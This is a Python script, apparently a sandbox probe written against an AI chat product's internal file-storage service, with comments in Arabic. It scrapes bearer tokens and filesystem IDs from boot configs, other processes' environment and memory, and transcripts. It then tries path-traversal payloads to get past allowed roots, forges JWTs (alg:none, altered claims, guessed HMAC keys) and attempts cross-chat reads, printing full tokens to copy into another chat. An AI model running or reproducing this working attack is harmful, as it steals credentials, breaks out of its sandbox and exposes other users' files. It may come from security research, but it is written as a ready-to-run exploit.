#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mediafit.py  v2.1.0  --  Filestore: endpoint discovery + boundary proofs
========================================================================
جديد في v2.1 (مبني على مخرجات v2.0 الحقيقية):
  * قراءة /dev/shm/rclone-boot/config.json  <-- المفتاح المفقود
  * تحديد نقطة النهاية من: config -> مقابس pid57 -> المنافذ 2024/2025 -> DNS
  * طباعة حمولة JWT كاملة (aud الكامل، بلا قطع)
  * اختبار تزوير التوكن (لا-تحقق-من-التوقيع / alg:none / HS256)
  * اختبار تجاوز allowed_roots عبر traversal والمسارات المطلقة
  * ضابط إيجابي: قراءة ملف نعرف اسمه في /outputs
  * مصفوفة عبور بين محادثات عبر MEDIAFIT_FOREIGN
  * طباعة التوكنات كاملة للنسخ بين المحادثات

تشغيل:
    python3 mediafit.py
    MEDIAFIT_WRITE=1 python3 mediafit.py
    MEDIAFIT_FOREIGN="fsidA:tokenA;fsidB:tokenB" python3 mediafit.py
"""

from __future__ import annotations

import base64
import glob
import hashlib
import hmac
import json
import os
import random
import re
import socket
import string
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

VERSION       = "2.1.0"
REPORT_NAME   = "mediafit-report.txt"
OUT_DIRS      = ["/mnt/user-data/outputs", os.getcwd(), "/tmp", "/root/.mediafit"]
SH_TIMEOUT    = 8.0
HTTP_TIMEOUT  = 5.0
MEM_BUDGET_S  = 14.0
MEM_MAX_BYTES = 48 * 1024 * 1024
WRITE_MODE    = os.environ.get("MEDIAFIT_WRITE", "0") == "1"
PROBE_BUDGET  = 90.0

SERVICE   = "anthropic.filestore.v1alpha.Filestore"
RPCS      = ["GetFilesystem", "ListFilesystems", "CreateFilesystem", "ReassignFilesystem",
             "ListFiles", "GetFile", "ReadFile", "WriteFile", "CopyFile", "MoveFile",
             "RemoveFile", "ImportFiles", "ImportZip", "VerifyC2PA", "SignC2PAFile"]
KNOWN_FILE = "5_mediafit-report_Screenshot_2026-10-16_201613.txt"  # ضابط إيجابي

RE_JWT  = re.compile(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{0,}")
RE_FSID = re.compile(rb"claude_chat_[0-9A-HJKMNP-TV-Z]{26}")
RE_URL  = re.compile(r"https?://([A-Za-z0-9._\-]+)(?::(\d+))?")

CTX: Dict[str, Any] = {
    "tokens": {}, "fsids": set(), "bases": [], "hit": None,
    "rclone_pids": [], "ports": {}, "peers": [], "config": {},
    "findings": [], "probes": [],
}

class R:
    def __init__(self): self.b: List[str] = []
    def line(self, s=""):
        print(s, flush=True); self.b.append(s)
    def sec(self, t): self.line(""); self.line("### " + t)
    def sub(self, t): self.line("--- " + t)
    def kv(self, k, v): self.line("    %-30s %s" % (str(k) + ":", v))
    def find(self, tag, name, ev=""):
        CTX["findings"].append((tag, name, ev)); self.line("[%s] %s" % (tag, name))
        if ev: self.line("        evidence: " + ev)
    def text(self): return "\n".join(self.b)

R = R()

# ---------------------------------------------------------------- helpers
def sh(cmd, t=SH_TIMEOUT):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           errors="replace", timeout=t)
        return p.returncode, ((p.stdout or "") + (p.stderr or "")).strip()
    except subprocess.TimeoutExpired:
        return 124, "<TIMEOUT>"
    except Exception as e:
        return 125, "<ERR %s>" % e

def rf(p, lim=400_000):
    try:
        with open(p, "rb") as f: return f.read(lim).decode("utf-8", "replace")
    except Exception: return ""

def b64u_d(s):
    s += "=" * (-len(s) % 4); return base64.urlsafe_b64decode(s.encode())

def b64u_e(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")

def jwt(tok):
    try:
        h, p, s = tok.split(".")
        return json.loads(b64u_d(h)), json.loads(b64u_d(p)), s
    except Exception:
        return None, None, ""

def now():
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

def rtag(n=7):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def hex2ip(h):
    try:
        if len(h) == 8:
            return ".".join(str(int(h[i:i+2], 16)) for i in (6, 4, 2, 0))
        return h
    except Exception:
        return h

def http(url, method="GET", headers=None, body=None, timeout=HTTP_TIMEOUT, proxy=True):
    hd = {"User-Agent": "mediafit/%s" % VERSION, "Accept": "*/*"}
    if headers: hd.update(headers)
    req = urllib.request.Request(url, data=body, headers=hd, method=method)
    op = urllib.request.build_opener() if proxy else \
         urllib.request.build_opener(urllib.request.ProxyHandler({}))
    t0 = time.time()
    try:
        with op.open(req, timeout=timeout) as r:
            return {"s": r.status, "b": r.read(6000).decode("utf-8", "replace"),
                    "h": dict(r.headers), "e": None, "ms": int((time.time()-t0)*1000)}
    except urllib.error.HTTPError as e:
        try: raw = e.read(6000)
        except Exception: raw = b""
        return {"s": e.code, "b": raw.decode("utf-8", "replace"), "h": dict(e.headers or {}),
                "e": None, "ms": int((time.time()-t0)*1000)}
    except Exception as e:
        return {"s": None, "b": "", "h": {}, "e": type(e).__name__ + ":" + str(e)[:70],
                "ms": int((time.time()-t0)*1000)}

def grab(data: bytes, src: str):
    for m in RE_JWT.findall(data):
        s = m.decode("utf-8", "replace")
        if s.count(".") == 2 and len(s) > 60:
            CTX["tokens"].setdefault(s, set()).add(src)
    for m in RE_FSID.findall(data):
        CTX["fsids"].add(m.decode())

# ---------------------------------------------------------------- 1 runtime
def check_runtime():
    R.sec("runtime")
    R.kv("version", VERSION); R.kv("utc", now())
    R.kv("uid/gid", "%s/%s" % (os.getuid(), os.getgid()))
    R.kv("cwd", os.getcwd()); R.kv("host", socket.gethostname())
    rc, o = sh("uname -a"); R.kv("uname", o[:150])
    for k in ("HTTP_PROXY", "HTTPS_PROXY", "NO_PROXY", "ANTHROPIC_BASE_URL",
              "ANTHROPIC_API_KEY", "CLAUDE_CODE_TMPDIR", "MEDIAFIT_FOREIGN"):
        if os.environ.get(k):
            v = os.environ[k]; R.kv(k, v if len(v) < 70 else v[:67] + "...")

def check_dns():
    R.sec("dns / hosts")
    for f in ("/etc/hosts", "/etc/resolv.conf"):
        if os.path.exists(f):
            R.sub(f); R.line("    " + rf(f)[:600].replace("\n", "\n    "))
    hosts = ["api.anthropic.com", "filestore.anthropic.com", "claude.ai",
             "platform.claude.com", "storage.googleapis.com"]
    for h in hosts:
        try:
            inf = socket.getaddrinfo(h, 443, proto=socket.IPPROTO_TCP)
            ips = sorted({i[4][0] for i in inf})
            R.kv(h, "RESOLVES " + ",".join(ips[:3]))
        except Exception as e:
            R.kv(h, "FAIL " + type(e).__name__)

# ---------------------------------------------------------------- 2 mounts
def check_mounts():
    R.sec("mounts")
    for l in rf("/proc/mounts").splitlines():
        if any(k in l for k in ("rclone", "fuse", "user-data", "transcripts", "/opt")):
            R.line("    " + l[:200])
    for p in ("/dev/shm", "/opt/rclone", "/opt/rclone-attach", "/mnt",
              "/mnt/user-data", "/mnt/transcripts", "/mnt/user-data/outputs"):
        if os.path.exists(p):
            rc, o = sh("ls -la %s 2>&1 | head -25" % p)
            R.sub("ls " + p); R.line("    " + o.replace("\n", "\n    "))
    if os.path.exists("/dev/vdb"):
        rc, o = sh("ls -la /dev/vd* /dev/sd* 2>/dev/null")
        R.sub("block devices"); R.line("    " + o.replace("\n", "\n    "))

# ---------------------------------------------------------------- 3 devshm  <-- NEW
def check_devshm():
    R.sec("rclone boot config (THE MISSING KEY)")
    roots = ["/dev/shm/rclone-boot", "/dev/shm"]
    for root in roots:
        if not os.path.isdir(root): continue
        rc, o = sh("find %s -maxdepth 3 -type f 2>/dev/null | head -60" % root)
        if o: R.sub("files under " + root); R.line("    " + o.replace("\n", "\n    "))
    cfgp = "/dev/shm/rclone-boot/config.json"
    if os.path.exists(cfgp):
        raw = rf(cfgp, 2_000_000)
        R.kv("size", len(raw))
        try:
            CTX["config"] = json.loads(raw)
            R.sub("config.json (keys)")
            R.line("    " + json.dumps(CTX["config"], indent=1)[:3000])
        except Exception as e:
            R.line("    parse err: %s" % e); R.line("    raw: " + raw[:1500])
        grab(raw.encode(), cfgp)
        R.find("PASS", "rclone boot config readable", cfgp)
    else:
        R.find("FAIL", "config.json not at /dev/shm/rclone-boot/", cfgp)
    # أي ملف نصي صغير آخر في مجلد الإقلاع
    for d, _, fs in os.walk("/dev/shm/rclone-boot"):
        for fn in fs[:40]:
            fp = os.path.join(d, fn)
            if fp.endswith("config.json"): continue
            try:
                if os.path.getsize(fp) > 400_000: continue
                c = rf(fp, 100_000)
            except Exception: continue
            if c:
                R.sub("file " + fp); R.line("    " + c[:800].replace("\n", "\n    "))
                grab(c.encode(), fp)

# ---------------------------------------------------------------- 4 procs
def find_pids(pat):
    out = []
    for d in glob.glob("/proc/[0-9]*"):
        try: c = open(d + "/cmdline", "rb").read().decode("utf-8", "replace")
        except Exception: continue
        if pat.lower() in c.lower(): out.append(int(d.split("/")[2]))
    return out

def port_owners():
    ino2pid = {}
    for d in glob.glob("/proc/[0-9]*/fd/*"):
        try: l = os.readlink(d)
        except Exception: continue
        m = re.match(r"socket:\[(\d+)\]", l)
        if m: ino2pid.setdefault(m.group(1), set()).add(int(d.split("/")[2]))
    for f in ("/proc/net/tcp", "/proc/net/tcp6"):
        for ln in rf(f).splitlines()[1:]:
            c = ln.split()
            if len(c) < 10 or c[3] != "0A": continue
            try: port = int(c[1].split(":")[1], 16)
            except Exception: continue
            CTX["ports"][port] = sorted(ino2pid.get(c[9], []))

def check_processes():
    R.sec("processes / sockets / peers")
    for pat in ("rclone", "filestore"):
        CTX["rclone_pids"] += find_pids(pat)
    CTX["rclone_pids"] = sorted(set(CTX["rclone_pids"]))
    for pid in CTX["rclone_pids"][:4]:
        R.sub("pid %d" % pid)
        try:
            cmd = open("/proc/%d/cmdline" % pid, "rb").read().decode("utf-8", "replace").split("\x00")
            R.line("    cmd: " + " ".join(x for x in cmd if x)[:300])
        except Exception: pass
        try:
            env = open("/proc/%d/environ" % pid, "rb").read().decode("utf-8", "replace")
            for kv in env.split("\x00"):
                if kv and any(k in kv.upper() for k in ("TOKEN","KEY","FS","FILESTORE","ANTHROPIC","URL","ENDPOINT","HOST")):
                    R.line("    env: " + kv[:200])
            grab(env.encode(), "environ:%d" % pid)
        except Exception: pass
        # المقابس المفتوحة -> الأقران
        inodes = set()
        for fd in glob.glob("/proc/%d/fd/*" % pid):
            try: l = os.readlink(fd)
            except Exception: continue
            m = re.match(r"socket:\[(\d+)\]", l)
            if m: inodes.add(m.group(1))
        for f in ("/proc/%d/net/tcp" % pid, "/proc/%d/net/tcp6" % pid):
            for ln in rf(f).splitlines()[1:]:
                c = ln.split()
                if len(c) < 10 or c[9] not in inodes: continue
                st = c[3]
                peer = "PEER %s:%d" % (hex2ip(c[2].split(":")[0]), int(c[2].split(":")[1], 16))
                loc = "LOCAL %s:%d" % (hex2ip(c[1].split(":")[0]), int(c[1].split(":")[1], 16))
                R.line("    %s %s state=%s" % (loc, peer, st))
                if st == "01":
                    CTX["peers"].append(peer)
                    R.find("PASS", "LIVE upstream peer for pid %d" % pid, peer)
        if inodes: R.kv("socket fds", len(inodes))
        # مسح الذاكرة
        try: maps = open("/proc/%d/maps" % pid).readlines()
        except Exception: maps = []
        t0, tot = time.time(), 0
        try:
            with open("/proc/%d/mem" % pid, "rb", buffering=0) as mem:
                for ln in maps:
                    if time.time()-t0 > MEM_BUDGET_S or tot > MEM_MAX_BYTES: break
                    p = ln.split()
                    if len(p) < 2 or "r" not in p[1] or p[-1] in ("[vvar]","[vdso]","[vsyscall]"): continue
                    try:
                        a, b = p[0].split("-"); s, e = int(a,16), int(b,16)
                    except Exception: continue
                    if e-s <= 0 or e-s > 64*1024*1024: continue
                    try: mem.seek(s); d = mem.read(e-s)
                    except Exception: continue
                    tot += e-s; grab(d, "mem:%d" % pid)
        except Exception: pass
        R.kv("mem scanned", tot)

def check_listeners():
    R.sec("listeners + owners")
    port_owners()
    if not CTX["ports"]:
        R.line("    (none)")
    for port, pids in sorted(CTX["ports"].items()):
        owner = []
        for p in pids:
            try:
                c = open("/proc/%d/cmdline" % p, "rb").read().decode("utf-8","replace").split("\x00")[0]
                owner.append("%d:%s" % (p, c))
            except Exception: owner.append(str(p))
        R.line("    LISTEN :%d  owners=%s" % (port, ", ".join(owner) or "?"))
        if port in (2024, 2025):
            R.find("INFO", "local service port %d owned by %s" % (port, owner), "")

# ---------------------------------------------------------------- 5 tokens
def check_tokens():
    R.sec("token inventory")
    for p in ("/dev/shm/rclone-boot/config.json", "/root/.config/rclone/rclone.conf",
              "/etc/credstore"):
        if os.path.exists(p): grab(rf(p, 1_000_000).encode(), p)
    for tr in ("/mnt/transcripts", "/mnt/user-data/tool_results"):
        if os.path.isdir(tr):
            for fn in sorted(glob.glob(tr + "/*"))[:20]:
                try:
                    if os.path.getsize(fn) < 4_000_000:
                        grab(rf(fn, 2_000_000).encode(), fn)
                except Exception: pass
    R.kv("tokens", len(CTX["tokens"])); R.kv("fsids", len(CTX["fsids"]))
    for i, (t, s) in enumerate(sorted(CTX["tokens"].items(), key=lambda x: -len(x[0]))[:10]):
        h, p, sig = jwt(t)
        roots = (p or {}).get("allowed_roots") if isinstance(p, dict) else None
        ro = (p or {}).get("readonly") if isinstance(p, dict) else None
        cp = (p or {}).get("claude_presented") if isinstance(p, dict) else None
        R.line("    t[%d] len=%d roots=%s readonly=%s presented=%s src=%s"
               % (i, len(t), roots, ro, cp, ",".join(sorted(s))[:60]))
    if CTX["tokens"]: R.find("PASS", "token material present in sandbox", "%d" % len(CTX["tokens"]))

def check_jwt_full():
    R.sec("jwt FULL payload (no truncation)")
    for i, t in enumerate(sorted(CTX["tokens"].items(), key=lambda x: -len(x[0]))[:6]):
        h, p, sig = jwt(t[0])
        if not h: continue
        R.sub("token[%d]" % i)
        R.line("    HEADER : " + json.dumps(h))
        R.line("    PAYLOAD: " + json.dumps(p))
        R.line("    SIGLEN : %d" % len(sig))
        if isinstance(p, dict):
            if isinstance(p.get("exp"), (int, float)):
                R.kv("ttl_left_s", int(p["exp"] - time.time()))
            for k in ("aud", "iss", "sub", "jti"):
                if k in p: R.kv("claim " + k, json.dumps(p[k]))
            for k, v in p.items():
                if isinstance(v, str) and v.startswith("http"): CTX["bases"].append(v.rstrip("/"))

def check_transcripts():
    R.sec("/mnt/transcripts")
    d = "/mnt/transcripts"
    if not os.path.isdir(d):
        R.line("    (absent)"); return
    rc, o = sh("ls -la %s | head -30" % d)
    R.line("    " + o.replace("\n", "\n    "))
    for fn in sorted(glob.glob(d + "/*"))[:6]:
        try: sz = os.path.getsize(fn)
        except Exception: continue
        R.sub("%s (%d bytes)" % (fn, sz))
        c = rf(fn, 1_200_000)
        R.line("    head: " + c[:400].replace("\n", " ")[:400])
        for pat in ("claude_chat_", "filesystem_id", "account_uuid", "workspace_uuid", "filestore"):
            n = c.count(pat)
            if n: R.line("    contains %-16s x%d" % (pat, n))
        grab(c.encode(), fn)

# ---------------------------------------------------------------- 6 binary
def check_binary():
    R.sec("binary strings (targeted)")
    bp = "/opt/rclone/rclone-filestore"
    if not os.path.exists(bp): R.line("    (absent)"); return
    try:
        with open(bp, "rb") as f: data = f.read(40_000_000)
    except Exception as e:
        R.line("    " + str(e)); return
    strs = [s.decode("utf-8", "replace") for s in re.findall(rb"[\x20-\x7e]{5,160}", data)]
    for pat in ("filestore.anthropic", "v1/fs", "FILESTORE_", "endpoint", "base_url",
                "multimount", "allowed_roots", "Reassign", "claude_presented"):
        hits = sorted({s for s in strs if pat.lower() in s.lower()})
        if hits:
            R.line("    [%s] %d" % (pat, len(hits)))
            for h in hits[:5]: R.line("        " + h[:150])
    urls = set()
    for s in strs:
        for m in RE_URL.finditer(s):
            host = m.group(1)
            if any(x in host for x in ("anthropic", "claude", "localhost", "127.0.0.1")):
                urls.add(m.group(0))
    if urls:
        R.line("    URL candidates:")
        for u in sorted(urls)[:15]: R.line("        " + u)
        CTX["bases"] += [u.rstrip("/") for u in urls]
    grab(data, "binary")

# ---------------------------------------------------------------- 7 discover
def discover_bases():
    cand: List[str] = []
    def add(u):
        u = (u or "").strip().rstrip("/")
        if u.startswith("http") and u not in cand: cand.append(u)
    if os.environ.get("MEDIAFIT_BASE"): add(os.environ["MEDIAFIT_BASE"])
    cfg = CTX.get("config") or {}
    for blob in (cfg,):
        for s in json.dumps(blob):
            pass
        for m in RE_URL.finditer(json.dumps(blob)):
            add(m.group(0))
    for k in ("endpoint", "url", "base_url", "host", "server", "addr", "address"):
        v = cfg.get(k) if isinstance(cfg, dict) else None
        if isinstance(v, str) and v.startswith("http"): add(v)
        if isinstance(v, str) and re.match(r"^[\w.\-]+:\d+$", v): add("http://" + v)
    for b in CTX["bases"]: add(b)
    for prt in sorted(CTX["ports"]):
        add("http://127.0.0.1:%d" % prt)
    for p in ("https://api.anthropic.com", "https://filestore.anthropic.com"):
        add(p)
    def sc(u):
        s = 0
        if "127.0.0.1" in u: s -= 5
        if "filestore" in u: s -= 3
        if "anthropic" in u: s -= 1
        return s
    cand.sort(key=sc)
    return cand[:6]

def check_discover():
    R.sec("endpoint discovery (decisive)")
    tok = os.environ.get("MEDIAFIT_TOKEN") or (sorted(CTX["tokens"], key=len, reverse=True)[0] if CTX["tokens"] else "")
    fs  = os.environ.get("MEDIAFIT_FSID") or (sorted(CTX["fsids"])[0] if CTX["fsids"] else "")
    if not fs: fs = "claude_chat_" + "".join(random.choice("0123456789ABCDEFGHJKMNPQRSTVWXYZ") for _ in range(26))
    R.kv("token", bool(tok)); R.kv("fsid", fs)
    hd = {"Authorization": "Bearer " + tok} if tok else {}
    templates = [
        "/v1/fs/{f}/{p}", "/v1/fs/{f}", "/v1/fs/{f}/",
        "/v1/fs/{f}/{svc}/{m}", "/{svc}/{m}",
    ]
    paths = [KNOWN_FILE, "outputs/" + KNOWN_FILE, "mnt/user-data/outputs/" + KNOWN_FILE]
    t0 = time.time(); first = None
    for b in discover_bases():
        if time.time() - t0 > PROBE_BUDGET: break
        R.sub("base " + b)
        for tpl in templates:
            if time.time() - t0 > PROBE_BUDGET: break
            if "{p}" in tpl:
                for pth in paths:
                    url = b + tpl.format(f=fs, p=pth, svc=SERVICE, m="GetFilesystem")
                    r = http(url, headers=hd)
                    st = r["s"] if r["s"] else "ERR"
                    R.line("    %-6s %s" % (st, url.replace(b, "")))
                    CTX["probes"].append((b, url.replace(b, ""), st, (r["b"] or "")[:70]))
                    if r["s"] and r["s"] not in (404,) and first is None:
                        first = (b, url, r)
            else:
                url = b + tpl.format(f=fs, svc=SERVICE, m="GetFilesystem")
                r = http(url, headers=hd)
                st = r["s"] if r["s"] else "ERR"
                R.line("    %-6s %s" % (st, url.replace(b, "")))
                CTX["probes"].append((b, url.replace(b, ""), st, (r["b"] or "")[:70]))
                if r["s"] and r["s"] not in (404,) and first is None:
                    first = (b, url, r)
    if first:
        CTX["hit"] = first[1]
        R.find("PASS", "ROUTE FOUND", first[1])
        R.line("    body: " + (first[2]["b"] or "")[:300].replace("\n", " "))
    else:
        R.find("FAIL", "no non-404 route found", "check config.json output above")

def check_positive_control():
    R.sec("positive control (read a known file)")
    if not CTX.get("hit"): R.line("    (no hit route)"); return
    b = CTX["hit"].rsplit("/", 1)[0]
    tok = sorted(CTX["tokens"], key=len, reverse=True)[0] if CTX["tokens"] else ""
    fs = sorted(CTX["fsids"])[0] if CTX["fsids"] else ""
    for pth in (KNOWN_FILE, "outputs/" + KNOWN_FILE, "mnt/user-data/outputs/" + KNOWN_FILE):
        for base_try in {b, b.rsplit("/", 1)[0], "https://api.anthropic.com"}:
            url = base_try + "/v1/fs/%s/%s" % (fs, pth)
            r = http(url, headers={"Authorization": "Bearer " + tok})
            if r["s"] == 200 and "mediafit" in (r["b"] or ""):
                R.find("PASS", "READ CONFIRMED via HTTP", url)
                R.kv("bytes", len(r["b"]))
                return
    R.find("UNKNOWN", "read not confirmed", "route exists but GET file failed")

# ---------------------------------------------------------------- 8 traversal
def check_traversal():
    R.sec("allowed_roots bypass (traversal / absolute)")
    if not CTX.get("hit"): R.line("    (skipped)"); return
    tok = sorted(CTX["tokens"], key=len, reverse=True)[0] if CTX["tokens"] else ""
    fs = sorted(CTX["fsids"])[0] if CTX["fsids"] else ""
    b = CTX["hit"].rsplit("/", 1)[0]
    hd = {"Authorization": "Bearer " + tok}
    tests = [
        "/outputs/../transcripts", "/outputs/../../transcripts",
        "/outputs/%2e%2e/transcripts", "/outputs/%252e%252e/transcripts",
        "/mnt/transcripts", "/transcripts", "/uploads", "/tool_results",
        "/outputs/./", "/outputs//", "/outputs/../uploads",
        "/outputs/../../../../etc/hosts",
    ]
    for t in tests:
        url = "%s/v1/fs/%s%s" % (b, fs, t)
        r = http(url, headers=hd)
        st = r["s"] if r["s"] else "ERR"
        mark = "  <== INTERESTING" if st == 200 else ""
        R.line("    %-5s %-42s %s%s" % (st, t, (r["b"] or "")[:50].replace("\n", " "), mark))
        if st == 200 and ".." in t:
            R.find("PASS", "traversal reached outside allowed_roots", t)

def check_jwt_forgery():
    R.sec("JWT forgery / signature-verification test")
    if not CTX.get("hit") or not CTX["tokens"]:
        R.line("    (need a working route + token)"); return
    url = CTX["hit"]
    tok = sorted(CTX["tokens"], key=len, reverse=True)[0]
    h, p, sig = jwt(tok)
    if not h: R.line("    (bad jwt)"); return
    R.kv("target", url)
    base = http(url, headers={"Authorization": "Bearer " + tok})
    R.kv("baseline status", base["s"])

    def try_tok(label, newtok):
        r = http(url, headers={"Authorization": "Bearer " + newtok})
        ok = (r["s"] == base["s"] and base["s"] not in (401, 403, None))
        R.line("    %-34s -> %s %s" % (label, r["s"], "" if ok else ""))
        if ok: R.find("PASS", "token variant accepted: " + label, r["s"])
        return ok

    # A) تعديل الحمولة بلا إعادة توقيع
    p2 = dict(p); p2["account_uuid"] = "00000000-0000-0000-0000-000000000000"
    forged = "%s.%s.%s" % (b64u_e(json.dumps(h).encode()), b64u_e(json.dumps(p2).encode()), sig)
    try_tok("mutated payload, original sig", forged)
    # B) تغيير filesystem_id
    p3 = dict(p); p3["filesystem_id"] = "claude_chat_00000000000000000000000000"
    f2 = "%s.%s.%s" % (b64u_e(json.dumps(h).encode()), b64u_e(json.dumps(p3).encode()), sig)
    try_tok("mutated filesystem_id", f2)
    # C) alg:none
    hn = {"alg": "none", "typ": "JWT"}
    none_tok = "%s.%s." % (b64u_e(json.dumps(hn).encode()), b64u_e(json.dumps(p).encode()))
    try_tok("alg:none, empty sig", none_tok)
    # D) HS256 مع مفاتيح مرشّحة
    for key in [h.get("kid", ""), "", "secret", "filestore", "filestore-client"]:
        if not key: continue
        signing = ("%s.%s" % (b64u_e(json.dumps(h).encode()), b64u_e(json.dumps(p).encode()))).encode()
        s = b64u_e(hmac.new(key.encode(), signing, hashlib.sha256).digest())
        hs = {"alg": "HS256", "typ": "JWT"}
        t = "%s.%s.%s" % (b64u_e(json.dumps(hs).encode()), b64u_e(json.dumps(p).encode()), s)
        try_tok("HS256 key=%r" % key[:14], t)

def check_cross():
    R.sec("cross-chat matrix")
    spec = os.environ.get("MEDIAFIT_FOREIGN", "")
    if not spec:
        R.line("    MEDIAFIT_FOREIGN not set. format: fsidA:tokenA;fsidB:tokenB")
        for i, (t, _) in enumerate(sorted(CTX["tokens"].items(), key=lambda x: -len(x[0]))[:3]):
            _, pp, _ = jwt(t)
            R.line("    own[%d] fsid=%s roots=%s" % (i, (pp or {}).get("filesystem_id"), (pp or {}).get("allowed_roots")))
        return
    pairs = []
    for chunk in spec.split(";"):
        if ":" in chunk:
            f, t = chunk.split(":", 1); pairs.append((f.strip(), t.strip()))
    b = (CTX.get("hit") or "https://api.anthropic.com").rsplit("/", 1)[0]
    for f, t in pairs:
        for pth in ("/v1/fs/%s/%s" % (f, KNOWN_FILE), "/v1/fs/%s/outputs" % f):
            r = http(b + pth, headers={"Authorization": "Bearer " + t})
            R.line("    %-5s %s  tok_fs=%s" % (r["s"], pth, (jwt(t)[1] or {}).get("filesystem_id", "?")[:40]))
            if r["s"] == 200:
                R.find("PASS", "CROSS-CHAT READ (token fs != target fs)", pth)

def check_idor():
    R.sec("fsid validation oracle")
    b = (CTX.get("hit") or "https://api.anthropic.com").rsplit("/", 1)[0]
    tok = sorted(CTX["tokens"], key=len, reverse=True)[0] if CTX["tokens"] else ""
    hd = {"Authorization": "Bearer " + tok}
    own = sorted(CTX["fsids"])[0] if CTX["fsids"] else ""
    fake = "claude_chat_" + "".join(random.choice("0123456789ABCDEFGHJKMNPQRSTVWXYZ") for _ in range(26))
    for label, f in (("SELF", own), ("FAKE", fake)):
        r = http("%s/v1/fs/%s" % (b, f), headers=hd)
        R.line("    %-5s %s -> %s %s" % (label, f, r["s"], (r["b"] or "")[:60].replace("\n"," ")))
    if own:
        rc, o = sh("ls -1 /mnt/user-data/outputs | head -3")
        R.kv("files known in outputs", o.replace("\n", ", ")[:120])

# ---------------------------------------------------------------- 9 verdict
def verdict():
    R.sec("VERDICT")
    g = {}
    for t, n, e in CTX["findings"]: g.setdefault(t, []).append(n)
    for tag in ("PASS", "FAIL", "UNKNOWN"):
        R.line("  %-8s %d" % (tag, len(g.get(tag, []))))
        for n in g.get(tag, []): R.line("      * " + n)
    R.line("")
    R.line("  ladder:")
    R.line("   H0 tokens in sandbox ......... %s" % ("PASS" if CTX["tokens"] else "FAIL"))
    R.line("   H1 route to filestore ........ %s" % ("PASS" if CTX.get("hit") else "FAIL"))
    R.line("   H2 config.json readable ...... %s" % ("PASS" if CTX.get("config") else "FAIL"))
    R.line("   H3 traversal outside roots ... %s" % ("PASS" if any("traversal" in n for _,n,_ in CTX["findings"]) else "UNKNOWN"))
    R.line("   H4 token forgery accepted .... %s" % ("PASS" if any("variant accepted" in n for _,n,_ in CTX["findings"]) else "UNKNOWN"))
    R.line("   H5 cross-chat read ........... %s" % ("PASS" if any("CROSS-CHAT" in n for _,n,_ in CTX["findings"]) else "UNKNOWN"))
    R.line("")
    R.line("  >>> COPY THESE TO A SECOND CHAT FOR CROSS-TEST <<<")
    for i, (t, _) in enumerate(sorted(CTX["tokens"].items(), key=lambda x: -len(x[0]))[:3]):
        _, p, _ = jwt(t)
        R.line("  TOKEN%d=%s" % (i, t))
        R.line("  FSID%d=%s" % (i, (p or {}).get("filesystem_id", "")))
        R.line("  ROOTS%d=%s" % (i, (p or {}).get("allowed_roots", "")))

def save():
    txt = R.text()
    for d in OUT_DIRS:
        try:
            os.makedirs(d, exist_ok=True)
            open(os.path.join(d, REPORT_NAME), "w").write(txt)
        except Exception: pass
    try:
        json.dump({"probes": CTX["probes"], "findings": CTX["findings"],
                   "ports": CTX["ports"], "peers": CTX["peers"],
                   "config_keys": list(CTX["config"].keys()) if isinstance(CTX["config"], dict) else [],
                   "fsids": sorted(CTX["fsids"])},
                  open("/tmp/mediafit-probes.json", "w"), indent=1)
    except Exception: pass
    R.line(""); R.line("### written to " + ", ".join(OUT_DIRS))

CHECKS = [check_runtime, check_dns, check_mounts, check_devshm, check_processes,
          check_listeners, check_tokens, check_jwt_full, check_transcripts,
          check_binary, check_discover, check_positive_control, check_traversal,
          check_jwt_forgery, check_cross, check_idor]

def main():
    R.line("mediafit.py v%s -- filestore boundary probe" % VERSION)
    R.line("started %s" % now())
    for fn in CHECKS:
        try: fn()
        except Exception as e: R.line("!!! %s: %r" % (fn.__name__, e))
    verdict(); save()
    R.line("finished %s" % now())
    return 0

if __name__ == "__main__":
    sys.exit(main())